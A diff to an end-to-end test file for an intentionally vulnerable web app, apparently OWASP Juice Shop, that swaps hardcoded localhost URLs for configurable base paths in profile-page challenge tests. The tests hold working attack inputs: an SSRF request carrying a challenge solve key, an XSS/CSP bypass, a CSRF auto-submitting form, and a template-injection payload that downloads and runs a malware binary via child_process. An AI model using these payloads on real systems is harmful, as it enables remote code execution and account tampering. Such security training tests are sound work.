@@ -14,12 +14,12 @@ describe('/profile', () => {
   describe('challenge "ssrf"', () => {
     it('should be possible to request internal resources using image upload URL', () => {
       browser.waitForAngularEnabled(false)
-      browser.get('/profile')
+      browser.get(protractor.basePath + '/profile')
       url = element(by.id('url'))
       submitButton = element(by.id('submitUrl'))
-      url.sendKeys('http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
+      url.sendKeys(browser.baseUrl + '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
       submitButton.click()
-      browser.get('/')
+      browser.get(protractor.basePath + '/')
       browser.driver.sleep(5000)
       browser.waitForAngularEnabled(true)
     })
@@ -30,7 +30,7 @@ describe('/profile', () => {
     describe('challenge "usernameXss"', () => {
       it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
         browser.waitForAngularEnabled(false)
-        browser.get('/profile')
+        browser.get(protractor.basePath + '/profile')
 
         const EC = protractor.ExpectedConditions
         url = element(by.id('url'))
@@ -50,10 +50,10 @@ describe('/profile', () => {
         username.clear()
         username.sendKeys('αδмιη') // disarm XSS
         submitButton.click()
-        url.sendKeys('http://localhost:3000/assets/public/images/uploads/default.svg')
+        url.sendKeys(browser.baseUrl + '/assets/public/images/uploads/default.svg')
         setProfileImageButton.click()
         browser.driver.sleep(5000)
-        browser.get('/')
+        browser.get(protractor.basePath + '/#/')
         browser.waitForAngularEnabled(true)
       })
       protractor.expect.challengeSolved({ challenge: 'CSP Bypass' })
@@ -62,12 +62,15 @@ describe('/profile', () => {
     describe('challenge "ssti"', () => {
       it('should be possible to inject arbitrary nodeJs commands in username', () => {
         browser.waitForAngularEnabled(false)
-        browser.get('/profile')
+        browser.get(protractor.basePath + '/profile')
         username = element(by.id('username'))
         submitButton = element(by.id('submit'))
         username.sendKeys('#{global.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
         submitButton.click()
-        browser.get('/')
+
+        browser.get(protractor.basePath + '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
+
+        browser.get(protractor.basePath + '/')
         browser.driver.sleep(10000)
         browser.waitForAngularEnabled(true)
       })
@@ -82,7 +85,7 @@ describe('/profile', () => {
       browser.driver.sleep(1000)
       /* The script executed below is equivalent to pasting this string into http://htmledit.squarefree.com: */
       /* <form action="http://localhost:3000/profile" method="POST"><input type="hidden" name="username" value="CSRF"/><input type="submit"/></form><script>document.forms[0].submit();</script> */
-      browser.executeScript("document.getElementsByName('editbox')[0].contentDocument.getElementsByName('ta')[0].value = \"<form action=\\\"http://localhost:3000/profile\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"username\\\" value=\\\"CSRF\\\"/><input type=\\\"submit\\\"/></form><script>document.forms[0].submit();</script>\"")
+      browser.executeScript("document.getElementsByName('editbox')[0].contentDocument.getElementsByName('ta')[0].value = \"<form action=\\\"" + browser.baseUrl + '/profile\\" method=\\"POST\\"><input type=\\"hidden\\" name=\\"username\\" value=\\"CSRF\\"/><input type=\\"submit\\"/></form><script>document.forms[0].submit();</script>"')
       browser.driver.sleep(5000)
       browser.waitForAngularEnabled(true)
     })
